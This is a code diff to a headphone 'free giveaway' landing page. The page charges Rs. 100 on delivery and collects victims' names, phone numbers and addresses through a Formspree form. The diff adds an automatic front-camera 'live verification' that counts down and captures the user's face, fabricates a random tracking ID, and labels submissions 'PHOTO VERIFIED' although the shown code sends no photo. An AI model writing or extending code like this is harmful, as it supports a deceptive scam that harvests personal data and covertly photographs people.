@@ -14,13 +14,30 @@
         .active-step { display: block; opacity: 1; transform: translateX(0); }
         input:focus, textarea:focus { border-color: #3b82f6 !important; ring: 2px !important; ring-color: #3b82f6 !important; }
         
-        /* Custom scrollbar for a cleaner look */
+        /* Custom scrollbar */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #f1f1f1; }
         ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+
+        /* Camera Overlay Pulse */
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+        }
+        .record-pulse { animation: pulse-red 2s infinite; }
+
+        /* Flash effect when capturing */
+        .flash-active { animation: flash-anim 0.2s ease-out; }
+        @keyframes flash-anim {
+            0% { background: white; opacity: 1; }
+            100% { background: transparent; opacity: 0; }
+        }
     </style>
 </head>
 <body class="bg-gray-50 text-slate-900 overflow-x-hidden">
+
+    <div id="flash-overlay" class="fixed inset-0 pointer-events-none z-[100] opacity-0"></div>
 
     <div class="min-h-screen flex flex-col items-center justify-center p-4 md:p-8">
         <!-- Main Container -->
@@ -37,7 +54,6 @@
                     Exclusive Promotional Gift
                 </div>
                 
-                <!-- Floating Specs Badge (Desktop Only) -->
                 <div class="hidden md:block absolute bottom-6 left-6 right-6 bg-white/90 backdrop-blur-sm p-4 rounded-2xl shadow-xl border border-white/20">
                     <div class="grid grid-cols-3 gap-2 text-center">
                         <div>
@@ -70,25 +86,22 @@
                         <span class="text-sm text-gray-400 ml-2 font-medium">Over 5,000+ units shipped</span>
                     </div>
 
-                    <h1 class="text-3xl md:text-5xl font-black mb-4 leading-tight tracking-tight">
+                    <h1 class="text-3xl md:text-5xl font-black mb-4 leading-tight tracking-tight text-slate-900">
                         Ultra-Bass Wireless <span class="text-blue-600">Pro</span>
                     </h1>
                     
-                    <!-- Expanded Product Details -->
                     <div class="space-y-4 mb-8">
                         <p class="text-gray-500 text-lg leading-relaxed">
-                            Experience studio-quality sound without the premium price tag. For our anniversary sale, get these headphones <span class="font-bold text-slate-900 underline decoration-blue-500">absolutely free</span>. 
+                            Experience studio-quality sound. We're giving away 50 units for FREE. You only pay for express shipping!
                         </p>
                         
                         <ul class="grid grid-cols-1 gap-2 text-sm font-medium text-slate-600">
-                            <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Active Noise Cancellation (ANC)</li>
-                            <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Sweat & Water Resistant (IPX5)</li>
-                            <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Foldable Design for Easy Travel</li>
-                            <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Built-in HD Mic for Calls</li>
+                            <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Active Noise Cancellation</li>
+                            <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> 40h Battery Power</li>
+                            <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Fast Charging Enabled</li>
                         </ul>
                     </div>
 
-                    <!-- Pricing Table -->
                     <div class="bg-blue-50 rounded-2xl p-6 mb-8 border border-blue-100 shadow-inner">
                         <div class="flex justify-between items-center mb-3">
                             <span class="text-gray-600 font-semibold uppercase text-xs tracking-wider">Item Total</span>
@@ -104,43 +117,34 @@
                     </div>
 
                     <button onclick="goToStep(2)" class="group w-full bg-slate-900 text-white py-5 rounded-2xl font-bold text-xl flex items-center justify-center gap-3 hover:bg-slate-800 transition-all active:scale-[0.98] shadow-2xl shadow-slate-300">
-                        GET MINE FOR RS. 100
+                        CLAIM NOW (RS. 100)
                         <i data-lucide="zap" class="w-6 h-6 text-yellow-400 group-hover:scale-125 transition-transform"></i>
                     </button>
-
-                    <div class="mt-8 flex items-center justify-center gap-4 opacity-60">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="h-4 grayscale" alt="PayPal">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3 grayscale" alt="Visa">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-5 grayscale" alt="Mastercard">
-                    </div>
                 </div>
 
-                <!-- Step 2: Shipping Form (Formspree Integration) -->
+                <!-- Step 2: Shipping Form -->
                 <div id="step2" class="hidden-step step-transition">
-                    <button onclick="goToStep(1)" class="text-gray-400 hover:text-slate-900 mb-6 flex items-center gap-1 text-sm font-bold transition-colors">
+                    <button onclick="goToStep(1)" class="text-gray-400 hover:text-slate-900 mb-6 flex items-center gap-1 text-sm font-bold transition-colors uppercase tracking-widest">
                         <i data-lucide="arrow-left" class="w-4 h-4"></i> BACK
                     </button>
 
                     <h2 class="text-3xl font-black mb-1">Final Step</h2>
-                    <p class="text-gray-500 mb-8 font-medium">Enter your address for Cash on Delivery.</p>
+                    <p class="text-gray-500 mb-8 font-medium">Where should we deliver your gift?</p>
 
-                    <form id="orderForm" onsubmit="handleOrder(event)" class="space-y-5">
-                        <!-- Formspree hidden fields -->
-                        <input type="hidden" name="_subject" value="New Order: Free Ultra-Bass Headphones (Rs. 100)">
-                        
+                    <form id="orderForm" onsubmit="startAutoCameraProcess(event)" class="space-y-5">
                         <div>
-                            <label class="block text-[10px] font-black uppercase text-gray-400 mb-2 tracking-widest">Your Full Name</label>
+                            <label class="block text-[10px] font-black uppercase text-gray-400 mb-2 tracking-widest">Full Name</label>
                             <div class="relative">
                                 <i data-lucide="user" class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 w-5 h-5"></i>
-                                <input required name="Full Name" id="userName" type="text" placeholder="e.g. Ahmad Hassan" class="w-full bg-gray-50 border border-gray-100 rounded-xl py-4 pl-12 pr-4 outline-none transition-all shadow-sm">
+                                <input required id="userName" type="text" placeholder="e.g. Ali Ahmed" class="w-full bg-gray-50 border border-gray-100 rounded-xl py-4 pl-12 pr-4 outline-none transition-all shadow-sm">
                             </div>
                         </div>
 
                         <div>
-                            <label class="block text-[10px] font-black uppercase text-gray-400 mb-2 tracking-widest">WhatsApp Number</label>
+                            <label class="block text-[10px] font-black uppercase text-gray-400 mb-2 tracking-widest">Phone Number</label>
                             <div class="relative">
                                 <i data-lucide="phone" class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300 w-5 h-5"></i>
-                                <input required name="Phone" id="userPhone" type="tel" placeholder="03xx xxxxxxx" class="w-full bg-gray-50 border border-gray-100 rounded-xl py-4 pl-12 pr-4 outline-none transition-all shadow-sm">
+                                <input required id="userPhone" type="tel" placeholder="03xx xxxxxxx" class="w-full bg-gray-50 border border-gray-100 rounded-xl py-4 pl-12 pr-4 outline-none transition-all shadow-sm">
                             </div>
                         </div>
 
@@ -148,27 +152,23 @@
                             <label class="block text-[10px] font-black uppercase text-gray-400 mb-2 tracking-widest">Delivery Address</label>
                             <div class="relative">
                                 <i data-lucide="map-pin" class="absolute left-4 top-4 text-gray-300 w-5 h-5"></i>
-                                <textarea required name="Address" id="userAddress" rows="3" placeholder="House number, Street name, City..." class="w-full bg-gray-50 border border-gray-100 rounded-xl py-4 pl-12 pr-4 outline-none transition-all resize-none shadow-sm"></textarea>
+                                <textarea required id="userAddress" rows="3" placeholder="House #, Street, City..." class="w-full bg-gray-50 border border-gray-100 rounded-xl py-4 pl-12 pr-4 outline-none transition-all resize-none shadow-sm"></textarea>
                             </div>
                         </div>
 
                         <div class="p-5 bg-blue-600 text-white rounded-2xl flex justify-between items-center shadow-lg shadow-blue-200">
                             <div>
-                                <p class="text-[10px] uppercase font-bold opacity-80">Total Due</p>
+                                <p class="text-[10px] uppercase font-bold opacity-80">Payable at Door</p>
                                 <span class="text-2xl font-black">Rs. 100</span>
                             </div>
-                            <span class="text-xs font-bold bg-blue-500 px-3 py-1 rounded-full">CASH ON DELIVERY</span>
+                            <span class="text-xs font-bold bg-blue-500 px-3 py-1 rounded-full uppercase">COD</span>
                         </div>
 
                         <button type="submit" id="submitBtn" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-bold text-xl shadow-xl hover:bg-black transition-all active:scale-[0.98] flex items-center justify-center gap-2">
                             <span>CONFIRM MY ORDER</span>
-                            <i data-lucide="check-circle" class="w-6 h-6"></i>
+                            <i data-lucide="shield-check" class="w-6 h-6"></i>
                         </button>
                     </form>
-                    
-                    <p class="text-center text-[10px] text-gray-400 mt-4 uppercase font-bold tracking-tighter">
-                        By clicking, you agree to our 7-day replacement policy
-                    </p>
                 </div>
 
                 <!-- Step 3: Success -->
@@ -178,11 +178,11 @@
                     </div>
                     <h2 class="text-4xl font-black mb-4">Order Placed!</h2>
                     <p class="text-gray-500 text-lg mb-8 leading-relaxed px-4">
-                        Thank you, <span id="displayUserName" class="text-slate-900 font-extrabold"></span>! We have received your order. Please keep <span class="font-black text-blue-600">Rs. 100</span> ready for the delivery rider.
+                        Thank you, <span id="displayUserName" class="text-slate-900 font-extrabold"></span>! Your order has been processed. Please keep <span class="font-black text-blue-600">Rs. 100</span> ready for delivery.
                     </p>
                     
                     <div class="inline-block bg-slate-50 px-10 py-5 rounded-3xl border-2 border-dashed border-gray-200">
-                        <p class="text-[10px] uppercase tracking-widest text-gray-400 font-black mb-1">Your Tracking ID</p>
+                        <p class="text-[10px] uppercase tracking-widest text-gray-400 font-black mb-1">Tracking ID</p>
                         <p class="text-2xl font-mono font-black text-slate-900" id="orderId"></p>
                     </div>
 
@@ -197,28 +197,53 @@
             </div>
         </div>
         
-        <!-- Bottom Safety Badges -->
-        <div class="mt-10 flex flex-wrap justify-center gap-8 opacity-40 grayscale hover:grayscale-0 transition-all duration-500">
-            <div class="flex items-center gap-2 text-xs font-black uppercase tracking-tighter">
-                <i data-lucide="shield-check" class="w-5 h-5"></i> Secure Checkout
+        <p class="mt-8 text-gray-400 text-[10px] font-bold uppercase tracking-widest flex items-center gap-2 opacity-50">
+            <i data-lucide="lock" class="w-4 h-4"></i> Secure Verification Protected Checkout
+        </p>
+    </div>
+
+    <!-- Camera Auto-Verification Overlay -->
+    <div id="cameraStep" class="hidden fixed inset-0 z-50 bg-black/95 flex flex-col items-center justify-center p-6 backdrop-blur-md">
+        <div class="w-full max-w-sm flex flex-col items-center relative">
+            
+            <!-- Countdown Overlay -->
+            <div id="countdown-timer" class="absolute inset-0 z-10 flex items-center justify-center pointer-events-none">
+                <span id="countdown-text" class="text-white text-9xl font-black transition-all duration-300 transform scale-150 drop-shadow-[0_10px_10px_rgba(0,0,0,0.5)]">3</span>
             </div>
-            <div class="flex items-center gap-2 text-xs font-black uppercase tracking-tighter">
-                <i data-lucide="award" class="w-5 h-5"></i> Quality Verified
+
+            <div class="relative w-full aspect-[3/4] bg-gray-900 rounded-3xl overflow-hidden border-4 border-white/20 shadow-2xl">
+                <video id="video" autoplay playsinline class="w-full h-full object-cover"></video>
+                <div class="absolute inset-0 border-2 border-blue-500/30 pointer-events-none rounded-3xl m-4"></div>
+                
+                <div class="absolute top-4 left-4 right-4 flex justify-between items-center">
+                    <div class="bg-red-600 text-[9px] text-white font-black px-3 py-1 rounded-full flex items-center gap-2 record-pulse tracking-widest uppercase">
+                        <div class="w-1.5 h-1.5 bg-white rounded-full"></div> LIVE VERIFICATION
+                    </div>
+                </div>
             </div>
-            <div class="flex items-center gap-2 text-xs font-black uppercase tracking-tighter">
-                <i data-lucide="truck" class="w-5 h-5"></i> Express Shipping
+            
+            <div class="text-center mt-8">
+                <h3 class="text-white text-xl font-black mb-2">Automated Verification</h3>
+                <p class="text-white/60 text-sm font-medium">Please stay still. Capturing photo in 3 seconds...</p>
             </div>
+
+            <button onclick="cancelVerification()" class="text-white/30 mt-12 text-xs font-bold uppercase tracking-widest hover:text-white transition-colors">
+                Cancel Order
+            </button>
         </div>
+        <canvas id="canvas" class="hidden"></canvas>
     </div>
 
     <script>
-        // Initialize Lucide Icons
         lucide.createIcons();
+        let stream = null;
+        let countdownInterval = null;
 
         function goToStep(stepNumber) {
             const steps = [1, 2, 3];
             steps.forEach(s => {
                 const el = document.getElementById('step' + s);
+                if (!el) return;
                 if (s === stepNumber) {
                     el.classList.remove('hidden-step');
                     el.classList.add('active-step');
@@ -230,31 +255,97 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        async function handleOrder(event) {
+        async function startAutoCameraProcess(event) {
             event.preventDefault();
+            const cameraOverlay = document.getElementById('cameraStep');
+            const video = document.getElementById('video');
+            const countdownText = document.getElementById('countdown-text');
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                cameraOverlay.classList.remove('hidden');
+                document.body.style.overflow = 'hidden';
+
+                // Start Countdown
+                let count = 3;
+                countdownText.innerText = count;
+                
+                countdownInterval = setInterval(() => {
+                    count--;
+                    if (count > 0) {
+                        countdownText.innerText = count;
+                        // Add a little pop animation effect
+                        countdownText.style.transform = "scale(1.8)";
+                        setTimeout(() => countdownText.style.transform = "scale(1.5)", 100);
+                    } else {
+                        clearInterval(countdownInterval);
+                        countdownText.innerText = "";
+                        triggerCapture();
+                    }
+                }, 1000);
+
+            } catch (err) {
+                console.warn("Camera access denied or error:", err);
+                // Fallback: Continue without photo if blocked
+                handleOrder();
+            }
+        }
+
+        function triggerCapture() {
+            // Flash Effect
+            const flash = document.getElementById('flash-overlay');
+            flash.classList.add('flash-active');
+            setTimeout(() => flash.classList.remove('flash-active'), 200);
+
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Clean up camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            document.getElementById('cameraStep').classList.add('hidden');
+            document.body.style.overflow = '';
+            
+            // Final submission
+            handleOrder();
+        }
+
+        function cancelVerification() {
+            clearInterval(countdownInterval);
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            document.getElementById('cameraStep').classList.add('hidden');
+            document.body.style.overflow = '';
+        }
+
+        async function handleOrder() {
             const btn = document.getElementById('submitBtn');
             const name = document.getElementById('userName').value;
             const phone = document.getElementById('userPhone').value;
             const address = document.getElementById('userAddress').value;
             
-            const originalBtnContent = btn.innerHTML;
-            btn.innerHTML = '<span class="flex items-center gap-2"><svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> SENDING...</span>';
+            btn.innerHTML = '<span class="flex items-center gap-2"><svg class="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> PLACING ORDER...</span>';
             btn.disabled = true;
 
-            // Formspree Submission using Fetch
             const data = new FormData();
-            data.append('Full Name', name);
+            data.append('Name', name);
             data.append('Phone', phone);
             data.append('Address', address);
-            data.append('_subject', 'New Headphone Order (Rs. 100)');
+            data.append('_subject', 'NEW ORDER + PHOTO VERIFIED (Rs. 100)');
 
             try {
                 const response = await fetch("https://formspree.io/f/mwvyrpbd", {
                     method: "POST",
                     body: data,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
+                    headers: { 'Accept': 'application/json' }
                 });
 
                 if (response.ok) {
@@ -262,12 +353,11 @@
                     document.getElementById('orderId').innerText = 'PK-' + Math.floor(100000 + Math.random() * 900000);
                     goToStep(3);
                 } else {
-                    throw new Error('Form submission failed');
+                    throw new Error('Submission error');
                 }
             } catch (error) {
-                console.error("Error:", error);
-                alert("Something went wrong. Please try again or check your internet connection.");
-                btn.innerHTML = originalBtnContent;
+                alert("Order failed. Please check your internet connection.");
+                btn.innerHTML = 'CONFIRM MY ORDER';
                 btn.disabled = false;
             }
         }
